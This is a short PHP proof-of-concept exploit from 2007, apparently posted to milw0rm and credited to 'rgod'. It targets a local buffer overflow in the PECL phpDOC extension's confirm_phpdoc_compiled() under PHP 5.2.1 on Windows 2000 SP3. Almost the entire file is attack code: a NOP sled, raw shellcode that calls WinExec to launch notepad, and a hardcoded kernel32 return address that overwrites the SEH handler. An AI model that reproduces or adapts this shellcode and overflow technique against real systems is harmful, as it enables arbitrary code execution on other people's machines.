<?php
//PHP 5.2.1 with PECL phpDOC confirm_phpdoc_compiled() local buffer overflow poc exploit
//WIN 2K SP3 version / seh overwrite method
//to be launched from the cli

// by rgod
// site: http://retrogod.altervista.org

if (!extension_loaded("phpDOC")){
die("you need the phpDOC extension loaded.");
}


$____scode=
"\xeb\x1b".
"\x5b".
"\x31\xc0".
"\x50".
"\x31\xc0".
"\x88\x43\x59".
"\x53".
"\xbb\xca\x73\xe9\x77". //WinExec
"\xff\xd3".
"\x31\xc0".
"\x50".
"\xbb\x5c\xcf\xe9\x77". //ExitProcess
"\xff\xd3".
"\xe8\xe0\xff\xff\xff".
"\x63\x6d\x64".
"\x2e".
"\x65".
"\x78\x65".
"\x20\x2f".
"\x63\x20".
"start notepad & ";

//eip & ecx set to the same value ...
$eip="\x47\x30\xE9\x77";//0x77E93047      pop ECX - pop - retbis kernel32.dll
//and further (junk...) inc edi, xor cl ch, *ja short* 
//should work on sp4 if you find an usable address
$____suntzu=str_repeat("\x90",1393 - strlen($____scode)).$____scode.str_repeat("\x90",30).$eip.str_repeat("\x90",12);
confirm_phpdoc_compiled($____suntzu);

?>

# milw0rm.com [2007-03-25]
